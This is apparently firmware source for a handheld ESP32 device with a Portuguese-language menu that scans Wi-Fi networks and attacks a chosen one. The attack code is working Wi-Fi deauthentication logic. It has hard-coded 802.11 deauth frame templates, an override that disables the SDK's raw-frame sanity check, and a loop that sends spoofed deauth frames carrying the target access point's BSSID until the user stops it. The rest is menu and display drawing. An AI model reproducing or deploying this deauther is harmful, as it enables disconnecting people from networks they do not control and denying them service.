#include "wifi.h"
#include "freertos/projdefs.h"
#include "wifi_service.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "st7789.h"
#include "sub_menu.h"
#include "driver/gpio.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "icons.h"
#include "led_control.h"
#include "esp_log.h"// Certifique-se que este arquivo contém o ícone 'wifi_main'
#include "pin_def.h" 
#include <string.h>

// =================================================================
// Definições e Variáveis Globais
// =================================================================
static const char *TAG = "wifi";
static SemaphoreHandle_t wifi_mutex = NULL;

// Armazena os resultados do último scan
#define WIFI_SCAN_LIST_SIZE 15
static wifi_ap_record_t stored_aps[WIFI_SCAN_LIST_SIZE];
static uint16_t stored_ap_count = 0;

// Definições de layout do menu
#define MAX_VISIBLE_ITEMS   4
#define ITEM_HEIGHT         55
#define ITEM_WIDTH          220
#define START_Y             40
#define ITEM_SPACING        8
#define SCROLL_BAR_WIDTH    5 
#define SCROLL_BAR_TOP      START_Y 

// Variáveis de estado do menu principal
static int currentSelection = 0;
static int offset = 0;

// =================================================================
// Protótipos das Funções
// =================================================================
static void wifi_action_scan(void);
static void wifi_action_attack(void);
static void wifi_action_server(void);
static void render_wifi_menu(void);
void wifi_deauther_scan(void);
void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type);

static void draw_header_fb(const char *title);
static void draw_menu_items_fb(void);
static void draw_menu_item_fb(const MenuItem *item, int y, bool selected);
static void draw_scroll_bar_fb(void);
// =================================================================
// Itens do Menu WiFi
// =================================================================
static const MenuItem wifiMenuItems[] = {
    { "Scannear Rede",         wifi_main, wifi_action_scan   },
    { "Atacar Alvo",           wifi_main, wifi_action_attack },
    { "Iniciar Servidor HTTP", wifi_main, wifi_action_server }
};
static const int wifiMenuSize = sizeof(wifiMenuItems) / sizeof(MenuItem);


static const uint8_t deauth_frame_invalid_auth[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

static const uint8_t deauth_frame_inactivity[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x04, 0x00
};

static const uint8_t deauth_frame_class3[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x07, 0x00
};

static const uint8_t* get_deauth_frame_template(deauth_frame_type_t type) {
    switch (type) {
        case DEAUTH_INVALID_AUTH:
            return deauth_frame_invalid_auth;
        case DEAUTH_INACTIVITY:
            return deauth_frame_inactivity;
        case DEAUTH_CLASS3:
            return deauth_frame_class3;
        default:
            return deauth_frame_invalid_auth;
    }
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}



// =================================================================
// Lógica de Scan e Ataque
// =================================================================

// Função para escanear redes e armazenar os resultados
void wifi_deauther_scan(void) {
    if (wifi_mutex == NULL) {
        wifi_mutex = xSemaphoreCreateMutex();
    }
    if (xSemaphoreTake(wifi_mutex, pdMS_TO_TICKS(1000)) != pdTRUE) {
        ESP_LOGE(TAG, "Falha ao obter mutex Wi-Fi");
        return;
    }

    // Configuração do scan
    wifi_scan_config_t scan_config = {
        .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true,
    };

    ESP_LOGI(TAG, "Iniciando scan de redes...");
    esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao iniciar scan: %s", esp_err_to_name(ret));
        led_blink_red();
        xSemaphoreGive(wifi_mutex);
        return;
    }

    // Obtém os resultados
    stored_ap_count = WIFI_SCAN_LIST_SIZE;
    ret = esp_wifi_scan_get_ap_records(&stored_ap_count, stored_aps);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao obter resultados do scan: %s", esp_err_to_name(ret));
        led_blink_red();
    } else {
        ESP_LOGI(TAG, "Encontrados %d pontos de acesso.", stored_ap_count);
        led_blink_blue();
    }

    xSemaphoreGive(wifi_mutex);
}
void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOGD(TAG, "Tentando enviar frame bruto de tamanho %d", size);
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao enviar frame bruto: %s (0x%x)", esp_err_to_name(ret), ret);
        led_blink_red();
    } else {
        ESP_LOGI(TAG, "Frame bruto enviado com sucesso");
        led_blink_green();
    }
}

void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
    const char* type_str = (type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
                           (type == DEAUTH_INACTIVITY) ? "INACTIVITY" : "CLASS3";
    ESP_LOGD(TAG, "Preparando frame de deauth (%s) para %s no canal %d", type_str, ap_record->ssid, ap_record->primary);
    ESP_LOGD(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

    const uint8_t *frame_template = get_deauth_frame_template(type);
    uint8_t deauth_frame[sizeof(deauth_frame_invalid_auth)];
    memcpy(deauth_frame, frame_template, sizeof(deauth_frame_invalid_auth));
    memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source MAC
    memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID

    ESP_LOGD(TAG, "Mudando para canal %d", ap_record->primary);
    esp_err_t ret = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao definir canal %d: %s", ap_record->primary, esp_err_to_name(ret));
        led_blink_red();
        return;
    }

    ESP_LOGD(TAG, "Enviando frame de deauth");
    wifi_deauther_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
}



// (As funções de ataque como 'get_deauth_frame_template' e 'wifi_deauther_send_deauth_frame' permanecem as mesmas)
// ... (código de ataque omitido por brevidade, mas deve ser mantido no seu arquivo) ...


// =================================================================
// Ações dos Itens do Menu
// =================================================================

// Ação para "Scannear Rede"
static void wifi_action_scan(void) {
    st7789_fill_screen_fb(ST7789_COLOR_BLACK);
    st7789_set_text_size(2);
    st7789_draw_text_fb(20, 110, "Escaneando redes...", ST7789_COLOR_PURPLE, ST7789_COLOR_BLACK);
    st7789_flush();
    
    wifi_deauther_scan(); // Executa o scan
    
    vTaskDelay(pdMS_TO_TICKS(500)); // Pequeno delay para mostrar a mensagem
}

// Ação para "Atacar Alvo" (agora um submenu)
static void wifi_action_attack(void) {

    while(!gpio_get_level(BTN_OK)){
      vTaskDelay(pdMS_TO_TICKS(20));
    }
    
    if (stored_ap_count == 0) {
        st7789_fill_screen_fb(ST7789_COLOR_BLACK);
        st7789_set_text_size(2);
        st7789_draw_text_fb(15, 110, "Nenhuma rede escaneada!", ST7789_COLOR_RED, ST7789_COLOR_BLACK);
        st7789_flush();
        vTaskDelay(pdMS_TO_TICKS(2000));
        return;
    }

    MenuItem ap_menu[WIFI_SCAN_LIST_SIZE];
    char ap_labels[WIFI_SCAN_LIST_SIZE][33]; // Aumentado para 33 para garantir espaço para o nulo
    int ap_menu_size = stored_ap_count;

    for (int i = 0; i < stored_ap_count; i++) {
        strncpy(ap_labels[i], (const char*)stored_aps[i].ssid, sizeof(ap_labels[i]) - 1);
        ap_labels[i][sizeof(ap_labels[i]) - 1] = '\0';
        ap_menu[i].label = ap_labels[i];
        ap_menu[i].icon = wifi_main;
        ap_menu[i].action = NULL;
    }

    int ap_selection = 0;
    int ap_offset = 0;
    bool stay_in_ap_menu = true;

    while (stay_in_ap_menu) {
        // Renderiza o menu de seleção de APs
        st7789_fill_screen_fb(ST7789_COLOR_BLACK);
        st7789_fill_rect_fb(0, 0, 240, 30, ST7789_COLOR_PURPLE);
        st7789_set_text_size(2);
        st7789_draw_text_fb(10, 7, "Selecionar Alvo", ST7789_COLOR_WHITE, ST7789_COLOR_PURPLE);

        if (ap_selection < ap_offset) ap_offset = ap_selection;
        else if (ap_selection >= ap_offset + MAX_VISIBLE_ITEMS) ap_offset = ap_selection - MAX_VISIBLE_ITEMS + 1;

        for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
            int menuIndex = i + ap_offset;
            if (menuIndex < ap_menu_size) {
                int posY = START_Y + i * (ITEM_HEIGHT + ITEM_SPACING);
                draw_menu_item_fb(&ap_menu[menuIndex], posY, menuIndex == ap_selection);
            }
        }
        st7789_flush();

        // Lida com a entrada do usuário
        bool input_processed = false;
        while (!input_processed) {
            if (!gpio_get_level(BTN_UP)) {
                while(!gpio_get_level(BTN_UP)) vTaskDelay(pdMS_TO_TICKS(200));
                ap_selection = (ap_selection - 1 + ap_menu_size) % ap_menu_size;
                input_processed = true;
            } else if (!gpio_get_level(BTN_DOWN)) {
                while(!gpio_get_level(BTN_DOWN)) vTaskDelay(pdMS_TO_TICKS(200));
                ap_selection = (ap_selection + 1) % ap_menu_size;
                input_processed = true;
            } else if (!gpio_get_level(BTN_OK)) {
                while(!gpio_get_level(BTN_OK)) vTaskDelay(pdMS_TO_TICKS(200));
                st7789_fill_screen_fb(ST7789_COLOR_BLACK);
                char attack_msg[64];
                snprintf(attack_msg, sizeof(attack_msg), "Atacando %s...", stored_aps[ap_selection].ssid);
                st7789_set_text_size(2);
                st7789_draw_text_fb(20, 110, attack_msg, ST7789_COLOR_RED, ST7789_COLOR_BLACK);
                st7789_set_text_size(1);
                st7789_draw_text_fb(20, 120, "Pressione BACK para parar", ST7789_COLOR_GRAY, ST7789_COLOR_BLACK);
                st7789_flush();
                while(1){
                  wifi_deauther_send_deauth_frame(&stored_aps[ap_selection], DEAUTH_INVALID_AUTH);
                  if (!gpio_get_level(BTN_BACK)){
                    while(!gpio_get_level(BTN_BACK)) vTaskDelay(pdMS_TO_TICKS(20));
                    break;
                  }
                  vTaskDelay(pdMS_TO_TICKS(5));
                }
                stay_in_ap_menu = false;
                input_processed = true;
            } else if (!gpio_get_level(BTN_BACK)) {
                while(!gpio_get_level(BTN_BACK)) vTaskDelay(pdMS_TO_TICKS(200));
                stay_in_ap_menu = false;
                input_processed = true;
            }
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}

// Ação para "Iniciar Servidor HTTP"
static void wifi_action_server(void) {
    st7789_fill_screen_fb(ST7789_COLOR_BLACK);
    st7789_set_text_size(2);
    st7789_draw_text_fb(15, 110, "Servidor HTTP iniciado!", ST7789_COLOR_GREEN, ST7789_COLOR_BLACK);
    st7789_flush();
    vTaskDelay(pdMS_TO_TICKS(2000));
}


// =================================================================
// Lógica de Desenho e Controle do Menu
// =================================================================

// ✨ RESTAURADO: Funções de desenho que foram omitidas

// Função principal que desenha a tela inteira
static void render_wifi_menu(void) {
    st7789_fill_screen_fb(ST7789_COLOR_BLACK);
    draw_header_fb("Menu WiFi");
    draw_menu_items_fb();
    draw_scroll_bar_fb();
    st7789_flush();
}

static void draw_header_fb(const char *title) {
    st7789_fill_rect_fb(0, 0, 240, 30, ST7789_COLOR_PURPLE);
    st7789_set_text_size(2);
    st7789_draw_text_fb(10, 7, title, ST7789_COLOR_WHITE, ST7789_COLOR_PURPLE);
}

static void draw_menu_items_fb(void) {
    if (currentSelection < offset) {
        offset = currentSelection;
    } else if (currentSelection >= offset + MAX_VISIBLE_ITEMS) {
        offset = currentSelection - MAX_VISIBLE_ITEMS + 1;
    }

    for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
        int menuIndex = i + offset;
        if (menuIndex < wifiMenuSize) {
            int posY = START_Y + i * (ITEM_HEIGHT + ITEM_SPACING);
            draw_menu_item_fb(&wifiMenuItems[menuIndex], posY, menuIndex == currentSelection);
        }
    }
}

static void draw_menu_item_fb(const MenuItem *item, int y, bool selected) {
    int iconSize = 24;
    int textX = selected ? 65 : 50;
    int iconX = selected ? 35 : 20;
    int iconY = y + (ITEM_HEIGHT - iconSize) / 2;
    uint16_t rect_color = selected ? ST7789_COLOR_LIGHT_PURPLE : ST7789_COLOR_PURPLE;
    uint16_t text_color = selected ? ST7789_COLOR_LIGHT_PURPLE : ST7789_COLOR_WHITE;

    st7789_draw_round_rect_fb(10, y, ITEM_WIDTH, ITEM_HEIGHT, 10, rect_color);
    st7789_draw_text_fb(textX, y + 15, item->label, text_color, ST7789_COLOR_BLACK);

    if (item->icon != NULL) {
        st7789_draw_image_fb(iconX, iconY, iconSize, iconSize, item->icon);
    }
}

static void draw_scroll_bar_fb(void) {
    if (wifiMenuSize <= MAX_VISIBLE_ITEMS) return;

    int usableHeight = ST7789_HEIGHT - START_Y;
    for (int y = START_Y; y < ST7789_HEIGHT; y += 5) {
        st7789_draw_pixel_fb(ST7789_WIDTH - SCROLL_BAR_WIDTH / 2, y, ST7789_COLOR_DARKGRAY);
    }

    float scrollBarHeight = (float)usableHeight * ((float)MAX_VISIBLE_ITEMS / wifiMenuSize);
    if (scrollBarHeight < 8) scrollBarHeight = 8;
    float maxScrollArea = usableHeight - scrollBarHeight;
    float scrollY = ((float)offset / (wifiMenuSize - MAX_VISIBLE_ITEMS)) * maxScrollArea;
    if (scrollY > maxScrollArea) scrollY = maxScrollArea;

    st7789_fill_round_rect_fb(ST7789_WIDTH - SCROLL_BAR_WIDTH, START_Y + (int)scrollY, SCROLL_BAR_WIDTH, (int)scrollBarHeight, 3, ST7789_COLOR_WHITE);
}


// Função pública que inicia e controla o menu WiFi
void show_wifi_menu(void) {
    currentSelection = 0;
    offset = 0;
    
    wifi_init();
    wifi_service_init();


    render_wifi_menu(); // Desenha a tela inicial do menu

    bool stayInMenu = true;
    while (stayInMenu) {
        bool updated = false;

        if (!gpio_get_level(BTN_UP)) {
            currentSelection = (currentSelection - 1 + wifiMenuSize) % wifiMenuSize;
            updated = true;
            vTaskDelay(pdMS_TO_TICKS(150));
        }
        else if (!gpio_get_level(BTN_DOWN)) {
            currentSelection = (currentSelection + 1) % wifiMenuSize;
            updated = true;
            vTaskDelay(pdMS_TO_TICKS(150));
        }
        else if (!gpio_get_level(BTN_OK)) {
            if (wifiMenuItems[currentSelection].action) {
                wifiMenuItems[currentSelection].action();
            }

            while (!gpio_get_level(BTN_OK)) {
              vTaskDelay(pdMS_TO_TICKS(80)); // Pequeno delay para não sobrecarregar a CPU
            }

            updated = true; // Redesenha o menu principal após a ação

        }
        else if (!gpio_get_level(BTN_BACK)) {
            stayInMenu = false;
            vTaskDelay(pdMS_TO_TICKS(200));
        }

        if (updated) {
            render_wifi_menu();
        }

        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

